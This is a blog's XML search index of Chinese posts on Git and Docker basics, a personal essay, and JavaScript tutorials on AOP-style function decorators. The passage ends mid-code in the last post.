<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Git分布式版本工具的部署与使用</title>
      <link href="/2019/01/07/git-basic/"/>
      <url>/2019/01/07/git-basic/</url>
      
        <content type="html"><![CDATA[<p>git目前是最快，最流行，也是最简单的分布式版本控制工具，相比svn这种的集中式管理，<br>分布式版本管理最大的<code>特点</code>就是“去中心化”，每个人的电脑上都相当于一个完整的版本库，我们不需要像集中式版本管理那样，每次都要从”中央处理器”下载全部文件后在进行更改，如果文件较大，在不同的局域网下，带宽小，时间会浪费在不断的下载更新文件之间。<br>git的<code>优势</code>是具有强大的分支管理，因为我们只需要master分支，就不在介绍了</p><a id="more"></a><h1 id="方案一：使用GUI-clients-图形化客户端"><a href="#方案一：使用GUI-clients-图形化客户端" class="headerlink" title="方案一：使用GUI clients(图形化客户端)"></a>方案一：使用GUI clients(图形化客户端)</h1><p>第一种方法是用老师说的图形化客户端，</p><ul><li>优点是图形可视化操作简单，直观；</li><li>缺点是图形化客户端封装不完全，有些复杂的概念还是需要git命令；正常的软件开发流程下，相比图形化客户端，使用命令行至少可以提高15%的效率。</li></ul><p><a href="https://git-scm.com/" target="_blank" rel="noopener">点击打开git官网</a></p><p>点download for windows</p><p><img src="http://www.chenqaq.com/assets/photos/gitGUI01.png" alt="download for"></p><p>然后左侧｀GUI Clients｀,右侧可以根据系统版本选择不同的git图形化客户端，windows或者mac下建议用老师说的｀GitHub Desktop｀,</p><p><img src="http://www.chenqaq.com/assets/photos/gitGUI02.png" alt="GUI client"></p><p><code>GitHub Desktop</code>操作简单，一目了然，下载之后，关联好自己的账号，大概用10-30分钟就可以正常使用了。没有linux版本的<code>github Desktop</code>，我就不在试啦，有问题的话可以多问下百度，或者私聊我。</p><h1 id="方案二：Git命令行"><a href="#方案二：Git命令行" class="headerlink" title="方案二：Git命令行"></a>方案二：Git命令行</h1><p>对于使用git命令行入手也非常容易，在官网，下载对应版本的git，一般是 <code>windows x64</code></p><p><img src="http://www.chenqaq.com/assets/photos/gitGUI03.png" alt="windows x64"></p><p>需要注意的是首次使用git需要命令行进行配置，在下面会演示一下<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">"My Name"</span></span><br><span class="line">git config --global user.email myEmail@example.com</span><br></pre></td></tr></table></figure></p><p>情况一：初次无文件未初始化的，仅对于课程设计需要，最简单的办法建议先起一个文件名建一个空file，浅蓝色部分下面<code>creating a new file</code><br><img src="http://www.chenqaq.com/assets/photos/gitGUI04.png" alt="无文件"></p><p>情况二：已经根据情况一的情况创建过了（或者其他办法），仓库存在了文件</p><video src="https://www.chenqaq.com/assets/videos/git.mp4" controls allowfullscreen="true" loop="true" autoplay="autoplay" muted width="100%" min-height="100%">embed: xss–chrome_test</video><p><code>git clone</code>:从远程仓库拉取一个项目，克隆到本地</p><p>克隆到本地之后一次正常的流程：</p><p><code>git pull</code>: 拉取项目变化（注意每次要修改本地文件前先从远程仓库pull一下，更新本地文件之后修改）</p><p><code>git add .</code>:将本地全部修改添加到暂存区（关于暂存区想要了解可以百度一下）</p><p><code>git commit -m &quot;something changes&quot;</code>:将本地修改批量添加到分支，（-m “xxx”，给本地提交添加说明注释）</p><p><code>git push</code>:将当前master分支全部推送到远程</p><p>push之后刷新客户端页面，就可以看到本次修改变化，github码云是一样的。<br>更多命令可以看新建的github的<a href="https://github.com/okaychen/studynotes/blob/master/git/git-command-lookup.md" target="_blank" rel="noopener">studynotes</a>仓库，或者可以通过网上学习git分布式版本控制更多更深入的内容。</p>]]></content>
      
      
      <categories>
          
          <category> 版本控制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker实践-Node应用部署</title>
      <link href="/2018/12/19/docker-howToDeploying-nodeWebapp/"/>
      <url>/2018/12/19/docker-howToDeploying-nodeWebapp/</url>
      
        <content type="html"><![CDATA[<p>下面是一个简单的例子，用来实现如何在docker容器内运行node程序。</p><video src="https://www.chenqaq.com/assets/videos/test-2018-12-19_17.23.50.mp4" controls allowfullscreen="true" loop="true" autoplay="autoplay" muted width="100%" min-height="100%">embed: xss–chrome_test</video><a id="more"></a><p>可以通过<code>sudo docker run -it mynodeapp /bin/bash</code>在新容器内开启一个终端并允许进行交互<br><img src="https://www.chenqaq.com/assets/images/docker-bash01.png" alt="在新容器内开启一个终端并可以进行交互"></p><p>关于Dockerfile的简单说明，更新在我的<a href="https://github.com/okaychen/studynotes/blob/master/docker/docker-deploying-node.md" target="_blank" rel="noopener">github的studynotes</a>中</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清风扶桑，沉醉不得归途</title>
      <link href="/2018/11/06/life-aboutLife20181106/"/>
      <url>/2018/11/06/life-aboutLife20181106/</url>
      
        <content type="html"><![CDATA[<p>其实这标题已经写了几日，然因外界诱惑加上很难找到一个安静的时间地点去完成这篇文章而迟迟没有构思下笔，直到今天得到11月12日漫威之父斯坦·李病逝的消息，我在计算机实验室写下了这篇文章，其实对我来说是一种罪过，与之相比我更愿意选择一个宁静的夜晚。就这样天堂安详的带走了漫威王国的缔造者之一斯坦·李，就在11月9日电影院上映的《毒液》中，我们还看到您客串的镜头，只愿您在平行宇宙间安好。</p><p><img src="https://ss0.baidu.com/6ONWsjip0QIZ8tyhnq/it/u=2976545619,795220049&amp;fm=173&amp;app=49&amp;f=JPEG?w=600&amp;h=400&amp;s=F0A8B955CF9144DE96A0A4C20300A0B3" alt=""></p><p>我不否认，我是一个前端领域的探索者，更是一个笔者，喜欢在安静的夜晚写上一篇文章，一度成为了我的一种习惯，就像现在每次打开QQ都忍不住看上兴趣部落两眼（虽然我并不认为这是一种好习惯），我希望我能同时拥有前端和笔者的视野，把这种习惯延续下去，值得庆幸的是我有很多精神领袖，阮一峰老师，张鑫旭大神，阿里的狼叔（I5ting），玉伯。虽然都素未谋面，但我一直追随着他们的脚步，在我的圈子中他们频繁出现，从个人博客，知乎，掘金，github，最后到语雀。相信文章是有温情的，虽未曾有过交集，读他们的文章，我仿佛清晰了他们对于技术以及生活的种种姿态，这就是文字的魔力吧！我还有一些追随者和同行者，感谢有人能够支持我的写作，从博客园到github最后到个人博客，让”okaychen“的代号至少在百度搜索清晰明确，还好有你们的存在，给我写作最大的动力。其实用这个代号有些名不副实，我并不会凡事“okay”，我有很强烈并且独立的思想让我尝试拒绝了一些东西。</p><p>有时喜欢笑称“我果然活成了自己的样子”，其实一人发呆亦或未入眠时也难免叹息是错的，青春的光阴岁月我们都曾迷茫和失落。大学两年是最开心充实的日子，因为有师傅一同奋进以及取得种种成果来满足自己的成就感而开心，因为有前端的快速更新迭代而充实，没有青天河，没有北京，电影院，有时甚至没有QQ微信，交际很少，却唯爱写作。我是一个不合格的朋友，因为很少给曾经同窗兄弟以及发小发句贴心问候，只有我身边亲近的看到我的人能感受到我的存在，但是感谢你们待我如初 – 要威傻班长以及飞诸位等等，希望你们早日得以所愿，一生平安。我是一个不合格的管理者，以至于大学二年级有人道来我这个组长很少和他们交流沟通，我曾聚以此事未有丝毫感情色彩的思想沉重反思之，难以破除性格因素，便尝试多利用社交平台沟通，把今年的主要任务放在了社团培养新人以及自身读书提高等方面。我是一个合格的写作者，热爱会促使你“合格”，希望会有越来越多的人喜欢我的写作，以及我运营的github和个人博客等等，也希望在越来越多的平台看到“okaychen”的身影。</p><p>最后送给设计组学弟学妹们，青春的气息是气海雪山，带你入梦，融梦心，破心境，是谓修行，希望你们学有所成，志有所至，开心快乐的度过四年大学时光。</p>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用AOP装饰函数-实践篇</title>
      <link href="/2018/10/23/js-higherOrderFn-DecoratorPatternToAOP2-md/"/>
      <url>/2018/10/23/js-higherOrderFn-DecoratorPatternToAOP2-md/</url>
      
        <content type="html"><![CDATA[<h1 id="后续：纸上得来终觉浅"><a href="#后续：纸上得来终觉浅" class="headerlink" title="后续：纸上得来终觉浅"></a>后续：纸上得来终觉浅</h1><p>老大见小T终于摸清了用AOP装饰函数的一些套路，很是欣慰，决定用实际情景让他试一试，老大拿出了一个最常见的AOP的经典应用之一—数据统计上报的情景，分离业务代码和数据统计上报的代码，在实际开发中项目结尾阶段难免要加上很多统计数据的代码，这个过程可能被迫改动早已封装好的函数.<br><a id="more"></a><br>1.老大给小T设定了一个情景如下：页面中有一个登录的button，点击这个button会弹出登录的浮层，与此同时需要进行数据上报来统计有多少用户点击了这个登录的button(这个任务可能是在项目结尾阶段进行的)，让小T发现问题并进行改写：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"login"</span> <span class="attr">id</span>=<span class="string">"login"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> login = <span class="built_in">document</span>.getElementById(<span class="string">'login'</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">const</span> textlogin = login.tagName;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> x = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> showLogin = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'打开登录浮层'</span>);</span></span><br><span class="line"><span class="undefined">            log(textlogin);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> log = <span class="function"><span class="keyword">function</span> (<span class="params">tag</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">            x = x + 1;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'上报标签为：'</span> + tag +<span class="string">','</span>+ <span class="string">'上报次数为：'</span> + x);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 这里我简单的用login按钮单击的次数来模拟，上报过程略</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        login.onclick = showLogin;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>小T发现在showLogin函数里既要弹层又要上报点击次数，两个层面的功能，却被耦合在一个函数中，决定用昨天刚写好的AOP试一试:<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"login"</span> <span class="attr">id</span>=<span class="string">"login"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">Function</span>.prototype.after = <span class="function"><span class="keyword">function</span>(<span class="params">afterfn</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> ret = _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="javascript">                afterfn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> ret;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> login = <span class="built_in">document</span>.getElementById(<span class="string">'login'</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">const</span> textlogin = login.tagName;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> x = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> showLogin = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'打开登录浮层'</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> log = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">            x = x+1;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'上报标签为：'</span> + tag +<span class="string">','</span>+ <span class="string">'上报次数为：'</span> + x);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="actionscript">        showLogin = showLogin.after(log); <span class="comment">// 打开登录浮层后上报数据</span></span></span><br><span class="line"><span class="undefined">        login.onclick = showLogin;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>小T欣喜若狂，这样两个不同层面功能的函数就可以单独维护，不存在耦合问题，决定把自己的成果给老大展示一番，老大看了微微一笑点了点头，觉得小T的进步着实很快，决定让他尝试一下用AOP动态改变函数的参数。</p><p>2.现有一个用于发起ajax请求的函数，这个函数负责项目中所有ajax的异步请求，这个ajax函数一直运转良好，跟CGI合作也很愉快，直到一次遭受了CSRF攻击，解决CSRF攻击最简单的方法就是在HTTP请求中加一个token参数，我们虽然可以选择直接多加一个token参数在ajax函数中。但是整个函数会变得十分僵硬，虽然对于现在的项目没有问题，但是将来把这个函数移植到其他项目，或者一个开源库中供他人使用，token参数都将是多余的。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向后台 cgi 发起一个请求来获取用户信息,传递给 cgi 的参数是baseParam和&#123; name:'sven' &#125;</span></span><br><span class="line"><span class="keyword">let</span> baseParam = &#123;</span><br><span class="line">    modname: modname,</span><br><span class="line">    orgcode: localorgcode,</span><br><span class="line">    cmduuid: cmduuid</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> ajax = <span class="function"><span class="keyword">function</span>(<span class="params">type,url,data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(dir);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type:type,</span><br><span class="line">            url:url,</span><br><span class="line">            data:<span class="built_in">JSON</span>.stringify(<span class="built_in">Object</span>.assign(&#123;&#125;, baseParam, data)),</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                <span class="comment">// 简单假设不做处理</span></span><br><span class="line">                resolve(data);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                reject(data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">ajax(<span class="string">'get'</span>,<span class="string">'http:// xxx.com/userinfo'</span>,&#123;<span class="attr">name</span>:<span class="string">'sven'</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//用于生成token的函数</span></span><br><span class="line"><span class="keyword">let</span> getToken = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Token'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//僵硬的在ajax函数中添加</span></span><br><span class="line"><span class="keyword">var</span> ajax = <span class="function"><span class="keyword">function</span>(<span class="params">type,url,data</span>)</span>&#123;</span><br><span class="line">    data = data || &#123;&#125;;</span><br><span class="line">    data.token = getToken();</span><br><span class="line">    <span class="comment">// 发送ajax请求略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>小T看到这里，觉得老大讲的确实有道理，僵硬的在ajax函数中增加传递参数也是正确的，但是复用性不大，无论是换一个项目还是在开源库中供别人使用，这个token都可能会是多余的，小T决定在不修改ajax原函数的情况下用AOP试一下改变函数的参数：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params">beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> getToken = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Token'</span>;</span><br><span class="line">&#125;</span><br><span class="line">ajax = ajax.before(<span class="function"><span class="keyword">function</span>(<span class="params">type,url,data</span>)</span>&#123;</span><br><span class="line">    data.Token = getToken();</span><br><span class="line">&#125;)</span><br><span class="line">ajax( <span class="string">'get'</span>, <span class="string">'http:// xxx.com/userinfo'</span>, &#123; <span class="attr">name</span>:<span class="string">'sven'</span> &#125; );</span><br></pre></td></tr></table></figure></p><p>小T打印出来向后台cgi传递的参数，发现多了token参数<code>{name: &quot;sven&quot;, Token: &quot;Token&quot;}</code>，小T发现用AOP的方式给ajax函数动态装饰上Token参数，保证了ajax是一个纯净的函数，提高ajax函数的复用性。<br>最后老大决定拿出来杀手锏，插件式的表单验证，想试一下小T是不是能融会贯通:</p><p>3.在web项目中，可能存在非常多的表单，如登录，注册，修改用户信息。在表单数据提交给后台之前，常常需要做一些校验，比如登录时需要验证用户名和密码是否为空，这样形如一个formSubmit函数就既要承担提交ajax请求，还要验证用户输入的合法性。这样一来就会造成代码的臃肿，职责混乱，二来谈不上复用性。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">        密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"password"</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"submitBtn"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> username = <span class="built_in">document</span>.getElementById( <span class="string">'username'</span> ),</span></span><br><span class="line"><span class="javascript">            password = <span class="built_in">document</span>.getElementById( <span class="string">'password'</span> ),</span></span><br><span class="line"><span class="javascript">            submitBtn = <span class="built_in">document</span>.getElementById( <span class="string">'submitBtn'</span> );</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">const</span> formSubmit = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span>(username.value == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="actionscript">                    retrun alert(<span class="string">'用户名不能为空'</span>);</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span>(password.value == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> alert(<span class="string">'密码不能为空'</span>);</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> param = &#123;</span></span><br><span class="line"><span class="undefined">                    username = username.value,</span></span><br><span class="line"><span class="undefined">                    password = password.value</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">                ajax(<span class="string">'http://xxx.com/login'</span>,param); <span class="comment">//ajax实现略</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">            submitBtn.onclick = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="undefined">                formSubmit();</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>小T看到这，决定先把校验的逻辑放到validata函数中：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> validata = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(username.value == <span class="string">''</span>)&#123;</span><br><span class="line">        retrun alert(<span class="string">'用户名不能为空'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(password.value == <span class="string">''</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">'密码不能为空'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formSubmit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( validata() === <span class="literal">false</span> )&#123; <span class="comment">//校验未通过</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> param = &#123;</span><br><span class="line">        username = username.value,</span><br><span class="line">        password = password.value</span><br><span class="line">    &#125;</span><br><span class="line">   ajax(<span class="string">'http://xxx.com/login'</span>,param); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">submitBtn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    formSubmit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>现在代码有了一些改进，小T已经把校验的逻辑放到了validata函数中，但是formSubmit函数内部还要计算validata函数的返回值，因为返回值的表明了是否通过校验。接下来小T想通过AOP来优化这段代码，使validata函数和formSubmit函数完全分离开来，这里小T发现些不一样的地方，因为要先校验，如果校验不通过不能执行后面的ajax代码，小T决定对上面学习的AOP进行改写：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params">beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="comment">// beforefn返回false，直接return，不在执行后面的原函数</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> validata = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( username.value === <span class="string">''</span> )&#123;</span><br><span class="line">        alert ( <span class="string">'用户名不能为空'</span> );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( password.value === <span class="string">''</span> )&#123;</span><br><span class="line">        alert ( <span class="string">'密码不能为空'</span> );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formSubmit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> param = &#123;</span><br><span class="line">    username: username.value,</span><br><span class="line">    password: password.value</span><br><span class="line">    &#125;</span><br><span class="line">    ajax( <span class="string">'http:// xxx.com/login'</span>, param );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">formSubmit = formSubmit.before( validata );</span><br><span class="line"></span><br><span class="line">submitBtn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    formSubmit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>到这里，校验输入和提交表单的代码就完全分离开来，它们不在存在耦合关系，如同把校验规则动态接在formSubmit函数之前，validata成了一个即插即用的函数，它甚至可以写成配置文件的形式，非常有利于分开维护这两个函数。</p><p>但是慢慢的小T也发现了用AOP装饰函数的一些缺点：因为函数通过Function.prototype.before和Function.prototype.after被装饰之后，返回的实际是一个新的函数，如果在原函数上保存了一些属性，那么这些属性会丢失：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func.a = <span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line">func = func.after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">2</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">alert(func.a); <span class="comment">//输出undefined</span></span><br></pre></td></tr></table></figure></p><p>除此之外，用AOP装饰方式也叠加了函数的作用域，如果装饰的链条过长，性能上也会受到一定的影响。</p><h1 id="金风玉露一相逢"><a href="#金风玉露一相逢" class="headerlink" title="金风玉露一相逢"></a>金风玉露一相逢</h1><p>小T终于完成了用AOP装饰函数的学习旅程，短短三天，小T与AOP从素未谋面到彼此熟悉，最后相熟相知，小T终于可以用AOP融会贯通的处理日常一些分离代码功能提高代码复用性的任务。渐渐的小T也了解到了用AOP装饰函数方式的缺点，更加游刃有余的结合实际开发进行运用</p><p><strong>人物与故事纯属虚构</strong></p><h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><p>《JavaScript设计模式与开发实践》 -  AlloyTeam曾探</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
            <tag> 装饰者模式 </tag>
            
            <tag> AOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用AOP装饰函数-摸索篇</title>
      <link href="/2018/10/18/js-higherOrderFn-DecoratorPatternToAOP1/"/>
      <url>/2018/10/18/js-higherOrderFn-DecoratorPatternToAOP1/</url>
      
        <content type="html"><![CDATA[<h1 id="开始：小荷才露尖尖角"><a href="#开始：小荷才露尖尖角" class="headerlink" title="开始：小荷才露尖尖角"></a>开始：小荷才露尖尖角</h1><p>有一天，老大见程序员小T的核心逻辑代码相当冗杂，核心逻辑模块和一些无关的功能融成一团，就告诉小T，让他尝试把日志统计，异常处理模块从和核心逻辑模块中抽离出来，对于刚入职经验不足的小T来说，犹如晴天霹雳。小T前思后想，还好大学期间读了不少编程相关的书籍有些功底，既然目的是想把一些日志统计、异常处理这些和核心逻辑代码无关的抽离出来，他灵机一闪，心想这不是面向切面编程(AOP)嘛，老大果然是老司机，把和核心逻辑模块无关的功能抽离出来，业务逻辑模块就清晰了很多，还能够复用日志统计、日常处理等这些功能模块，真是两全其美啊！<br><a id="more"></a></p><h1 id="发展：闲敲棋子落灯花"><a href="#发展：闲敲棋子落灯花" class="headerlink" title="发展：闲敲棋子落灯花"></a>发展：闲敲棋子落灯花</h1><p>于是小T开始了实现AOP之旅，心想核心业务模块和其他模块，那我就抽象成两个函数，既然需要在核心业务模块中使用异常处理这些功能，我应该把异常处理函数动态织入到其中，想到这小T不禁欣喜了一番，但是马上又陷入了思考，我应该怎么把一个函数”动态织入”到另一个函数中呢？小T之前对于原型的掌握相当扎实，于是他想我可不可以扩展Function的原型来把一个函数”动态织入”另一个函数呢.小T决定试一下，于是便敲敲打打：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span 